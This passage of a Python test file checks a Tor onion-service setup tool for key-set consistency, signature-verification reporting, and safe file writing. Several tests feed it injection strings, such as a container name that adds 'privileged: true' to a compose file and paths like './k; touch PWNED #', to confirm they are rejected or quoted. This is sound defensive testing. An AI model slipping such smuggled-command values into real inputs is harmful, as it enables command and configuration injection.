    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
        cmd, 0, "true\n", ""))
    assert hf._is_rootless() is True
    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
        cmd, 0, "false\n", ""))
    assert hf._is_rootless() is False
    monkeypatch.setattr(hf, "_run", lambda cmd, **kw: subprocess.CompletedProcess(
        cmd, 125, "", "no such command"))
    assert hf._is_rootless() is False
    monkeypatch.setattr(hf, "_engine", lambda: None)
    assert hf._is_rootless() is False


# ─────────────────────────────────────────────────────────────────────────────
# show: an address the container will not serve
# ─────────────────────────────────────────────────────────────────────────────

def test_a_hostname_that_disagrees_with_the_public_key_is_reported(hf, tmp_path):
    """The public key IS the address. A hostname file saying something else means
    the key set is inconsistent -- a partial restore, or files from two services
    in one directory -- and Tor rewrites `hostname` from the key at startup, so it
    serves the DERIVED address while the operator publishes the reported one.

    This project has already shipped an address nothing could reach once. An
    address the container will not serve is the same mistake in a different
    place. Measured in the image: Tor rewrote `hostname` to the key's address at
    startup. So neither value is reported as THE address; both are kept under
    their own names for diagnosis.
    """
    d = tmp_path / "app"
    d.mkdir()
    (d / "hs_ed25519_public_key").write_bytes(
        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
    (d / "hostname").write_text("b" * 56 + ".onion\n")
    entry = hf.address_for(tmp_path, "app")
    assert entry["source"] == "inconsistent"
    assert entry["onion"] is None
    assert entry["derived_matches"] is False
    assert entry["hostname_onion"] == "b" * 56 + ".onion"
    assert entry["derived_onion"] == VECTOR_ONION


def _inconsistent_volume(tmp_path):
    d = tmp_path / "app"
    d.mkdir()
    (d / "hs_ed25519_public_key").write_bytes(
        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
    (d / "hostname").write_text("b" * 56 + ".onion\n")
    return tmp_path


def test_show_refuses_an_inconsistent_key_set_by_exit_code(hf, tmp_path, capsys):
    """It used to print the hostname file's address with exit 0: the address an
    operator would publish, and not the one Tor serves."""
    keys = _inconsistent_volume(tmp_path)
    rc = hf.main(["show", "--keys", str(keys), "--name", "app", "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_FAIL and doc["ok"] is False
    assert doc["onion"] is None
    assert VECTOR_ONION in doc["error"]


def test_show_human_output_names_no_address_for_an_inconsistent_set(hf, tmp_path,
                                                                    capsys):
    keys = _inconsistent_volume(tmp_path)
    rc = hf.main(["show", "--keys", str(keys)])
    out, err = capsys.readouterr()
    assert rc == hf.EXIT_FAIL
    assert "b" * 56 not in out and VECTOR_ONION not in out
    assert "INCONSISTENT" in out and "error:" in err


def test_an_agreeing_key_set_says_so(hf, tmp_path):
    """Guard against reporting every key set as inconsistent."""
    d = tmp_path / "app"
    d.mkdir()
    (d / "hs_ed25519_public_key").write_bytes(
        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
    (d / "hostname").write_text(VECTOR_ONION + "\n")
    entry = hf.address_for(tmp_path, "app")
    assert entry["derived_matches"] is True
    assert entry["onion"] == VECTOR_ONION


def test_no_public_key_means_could_not_tell_not_fine(hf, tmp_path):
    """None, not False: "we could not check" and "it disagrees" are different
    answers, and only one of them is a fault."""
    d = tmp_path / "app"
    d.mkdir()
    (d / "hostname").write_text(VECTOR_ONION + "\n")
    entry = hf.address_for(tmp_path, "app")
    assert entry["derived_matches"] is None
    assert entry["onion"] == VECTOR_ONION


def test_doctor_fails_a_key_set_whose_hostname_disagrees(hf, tmp_path):
    d = tmp_path / "app"
    d.mkdir(mode=0o700)
    (d / "hs_ed25519_public_key").write_bytes(
        PUBLIC_TAG.ljust(32, b"\x00") + bytes.fromhex(VECTOR_PUB_HEX))
    (d / "hs_ed25519_secret_key").write_bytes(b"\x00" * 96)
    (d / "hostname").write_text("b" * 56 + ".onion\n")
    for p in d.iterdir():
        os.chmod(p, 0o600)
    checks: list = []
    hf._append_key_checks(checks, tmp_path)
    failed = [c for c in checks if not c["ok"]]
    assert any("matches the public key" in c["check"] for c in failed), checks


def test_a_container_name_cannot_open_a_second_compose_service(hf):
    """The same hole as the key path, one interpolation over, in the same file.
    `--container` becomes a YAML KEY (`  {container}:`). Reproduced before this
    test: a crafted name put `privileged: true` on the tor service and added a
    second service beside it."""
    yaml = _yaml_or_fail()
    evil = "tor:\n    privileged: true\n  other"
    with pytest.raises(ValueError, match="invalid container name"):
        hf.validate_container(evil)
    # And the generator quotes it for the shell regardless of validation.
    sh = hf.render_deploy_sh({"app": ["80:127.0.0.1:8080"]}, "/keys",
                             'tor"; id; echo "')
    for line in sh.splitlines():
        if "exec -T" in line:
            assert line.count("'") >= 2, line
    frag = hf.render_compose_fragment({"app": ["80:127.0.0.1:8080"]}, "img:1",
                                      "/keys", "tor")
    assert sorted(yaml.safe_load(frag)["services"]) == ["tor"]


def test_setup_refuses_an_injectable_container_name(hf, tmp_path, capsys):
    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
                  "--container", "tor\n    privileged: true", "-o", str(tmp_path),
                  "--json"])
    capsys.readouterr()
    assert rc != 0
    assert not (tmp_path / "compose.service.yml").exists()


def test_setup_refuses_an_out_of_range_onion_port(hf, tmp_path, capsys):
    """Emitting it anyway writes a compose file whose service the container drops
    at boot, with the reason only in a log the shipped compose file discards."""
    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
                  "--onion-port", "99999", "-o", str(tmp_path), "--json"])
    capsys.readouterr()
    assert rc != 0
    assert not (tmp_path / "compose.service.yml").exists()


def test_setup_still_accepts_the_ordinary_arguments(hf, tmp_path, capsys):
    """Guard against 'fixing' this by refusing what people actually type."""
    rc = hf.main(["setup", "--backend", "web:80", "--name", "blog",
                  "--container", "my-tor_1.sidecar", "--onion-port", "443",
                  "-o", str(tmp_path), "--json"])
    capsys.readouterr()
    assert rc == 0
    assert (tmp_path / "compose.service.yml").exists()


def test_verify_image_is_ok_but_not_complete_without_pqsign(hf, tmp_path, capsys,
                                                            monkeypatch):
    """`ok` answers "did anything that ran fail", not "was everything checked".

    The human output has always distinguished the two -- VERIFIED versus
    VERIFIED, BUT NOT COMPLETELY -- while the JSON offered only `ok`. A deploy
    gate keying on it would ship an image whose post-quantum half was never
    verified, because pqsign happened not to be installed on the runner. That is
    the signature-stripping downgrade arriving through the verifier's own
    reporting rather than through the signature.
    """
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:" + "ab" * 32, None))
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (True, "Good"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature",
                        lambda *a: (None, "pqsign not installed"))
    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json",
                  "--allow-classical-only"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == 0
    assert doc["ok"] is True
    assert doc["complete"] is False, "a half-checked hybrid signature is not complete"
    assert any("ML-DSA" in u for u in doc["unchecked"])


def test_verify_image_is_complete_when_both_halves_verified(hf, tmp_path, capsys,
                                                            monkeypatch):
    """The other side: a fully checked image must not be reported as partial."""
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:" + "ab" * 32, None))
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (True, "Good"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == 0
    assert doc["ok"] is True and doc["complete"] is True
    assert doc["unchecked"] == []


def test_an_unreachable_registry_fails_rather_than_reducing_to_signatures(
        hf, tmp_path, capsys, monkeypatch):
    """Without --skip-registry the digest comparison is a declared step.

    Checked while adding `complete`: a registry that cannot be reached is already
    a hard failure here, not a quiet downgrade to "the signatures were fine". It
    therefore does not belong in `unchecked` -- it belongs in `failures`, which
    is where it is. Pinned so a later refactor cannot soften it into a warning.
    """
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_resolve_registry_digest",
                        lambda i: (None, "registry unreachable"))
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (True, "Good"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_FAIL
    assert doc["ok"] is False and doc["complete"] is False
    assert any("registry" in f for f in doc["failures"])


def test_a_failed_verification_is_never_complete(hf, tmp_path, capsys, monkeypatch):
    d = _sigdir(tmp_path)
    monkeypatch.setattr(hf, "_resolve_registry_digest", lambda i: ("sha256:" + "ab" * 32, None))
    monkeypatch.setattr(hf, "_verify_ssh_signature", lambda *a: (False, "bad sig"))
    monkeypatch.setattr(hf, "_verify_mldsa_signature", lambda *a: (True, "ok"))
    rc = hf.main(["verify-image", "example/img:1", "--sigdir", str(d), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_FAIL
    assert doc["ok"] is False and doc["complete"] is False


# ─────────────────────────────────────────────────────────────────────────────
# setup: every COMMAND it prints is shell-quoted, not only deploy.sh
# ─────────────────────────────────────────────────────────────────────────────

_HOSTILE_KEYS = "./k; touch PWNED #"


def test_the_readme_command_quotes_the_key_path(hf, tmp_path, capsys):
    """README.txt is read by a person who copies its command lines into a shell.
    The key path was escaped in compose.service.yml and deploy.sh but went into
    README's `hiddenforge show --keys ...` line raw."""
    out = tmp_path / "o"
    assert hf.main(["setup", "--backend", "web:80", "--keys", _HOSTILE_KEYS,
                    "-o", str(out), "--non-interactive", "--json"]) == 0
    capsys.readouterr()
    line = next(ln for ln in (out / "README.txt").read_text().splitlines()
                if "hiddenforge show --keys" in ln)
    words = shlex.split(line)
    assert words[words.index("--keys") + 1] == _HOSTILE_KEYS
    assert "touch" not in words[:words.index("--keys") + 1]


def test_the_descriptor_merge_command_quotes_the_output_path(hf, tmp_path, capsys):
    """hiddenforge.json is the machine descriptor; its `merge`/`bare_command` are
    commands a program may hand to a shell."""
    out = tmp_path / "o; touch PWNED #"
    assert hf.main(["setup", "--backend", "web:80", "-o", str(out),
                    "--non-interactive", "--json"]) == 0
    doc = json.loads(capsys.readouterr().out)
    for field in ("merge", "bare_command"):
        words = shlex.split(doc[field])
        assert f"{out}/compose.service.yml" in words, field
        assert "touch" not in words, field


def test_vanity_refuses_a_key_path_the_engine_cannot_mount(hf, tmp_path, capsys,
                                                           monkeypatch):
    """`-v <path>:/keys` is split on colons by the engine; the failure used to
    surface as docker's "invalid mode: /keys", exit 1, with no mention of the
    path. Refused up front, before any engine is involved."""
    called = []
    monkeypatch.setattr(hf.subprocess, "run", lambda *a, **k: called.append(a))
    rc = hf.main(["vanity", "--prefix", "a", "--name", "x",
                  "--keys", str(tmp_path / "a:b"), "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc == hf.EXIT_USAGE and "contains ':'" in doc["error"]
    assert not called
    assert not (tmp_path / "a:b").exists()


def test_the_vanity_generator_runs_with_no_network(hf, tmp_path, capsys, monkeypatch):
    """It makes a secret key and needs nothing from the network, so the
    container it runs in gets none."""
    called = []
    monkeypatch.setattr(hf, "_engine", lambda: "docker")
    monkeypatch.setattr(hf.subprocess, "run", lambda cmd, **k: called.append(cmd) or
                        hf.subprocess.CompletedProcess(cmd, 1, "", "stop here"))
    hf.main(["vanity", "--prefix", "a", "--name", "x", "--keys", str(tmp_path),
             "--json"])
    cmd = called[0]
    assert cmd[:2] == ["docker", "run"]
    assert cmd[cmd.index("--network") + 1] == "none"
    assert cmd[cmd.index("--security-opt") + 1] == "no-new-privileges"


def test_show_does_not_hang_on_a_fifo_planted_as_the_hostname(hf, tmp_path, capsys):
    """_read_nofollow checked for a regular file only AFTER opening, and opening a
    FIFO blocks until a writer appears. O_NONBLOCK makes the open return so the
    check can refuse it."""
    import threading
    d = tmp_path / "app"
    d.mkdir()
    os.mkfifo(d / "hostname")
    done = threading.Event()
    threading.Thread(target=lambda: (hf.main(["show", "--keys", str(tmp_path),
                                              "--name", "app", "--json"]), done.set()),
                     daemon=True).start()
    assert done.wait(5), "show blocked on a FIFO"
    capsys.readouterr()


def test_setup_force_does_not_write_through_a_hardlinked_output(hf, tmp_path, capsys):
    """O_NOFOLLOW never stopped a hardlink: `setup --force` over a deploy.sh
    hard-linked to another file wrote the script into that file and made it
    0755. Output is now a fresh O_EXCL temp renamed into place."""
    out = tmp_path / "out"
    out.mkdir()
    precious = tmp_path / "precious"
    precious.write_text("do not touch")
    os.chmod(precious, 0o600)
    os.link(precious, out / "deploy.sh")
    assert hf.main(["setup", "--backend", "web:80", "-o", str(out), "--force",
                    "--non-interactive", "--json"]) == 0
    capsys.readouterr()
    assert precious.read_text() == "do not touch"
    assert stat.S_IMODE(os.stat(precious).st_mode) == 0o600
    assert (out / "deploy.sh").read_text().startswith("#!/usr/bin/env bash")
    assert os.stat(out / "deploy.sh").st_nlink == 1
    assert not list(out.glob(".*.tmp")), "no temp file left behind"


@pytest.mark.parametrize("plant", ["symlink", "directory"])
def test_setup_refuses_an_odd_output_before_writing_anything(hf, tmp_path, capsys,
                                                             plant):
    """It used to raise a traceback -- no JSON, off-contract -- after already
    writing a new compose file beside the old deploy script."""
    out = tmp_path / "out"
    out.mkdir()
    if plant == "symlink":
        (out / "README.txt").symlink_to(tmp_path / "elsewhere")
    else:
        (out / "README.txt").mkdir()
    rc = hf.main(["setup", "--backend", "web:80", "-o", str(out), "--force",
                  "--non-interactive", "--json"])
    doc = json.loads(capsys.readouterr().out)
    assert rc != 0 and "not a regular file" in doc["error"]
    assert sorted(p.name for p in out.iterdir()) == ["README.txt"], "nothing written"
